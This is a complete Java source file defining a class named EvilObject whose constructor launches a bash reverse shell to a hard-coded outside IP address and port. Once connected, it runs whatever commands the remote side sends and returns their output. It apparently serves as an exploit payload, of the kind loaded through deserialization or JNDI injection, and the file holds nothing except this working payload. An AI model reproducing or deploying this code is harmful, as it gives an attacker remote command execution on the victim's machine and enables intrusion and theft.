public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash", "-c", "exec 5<>/dev/tcp/75.119.131.210/4458;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
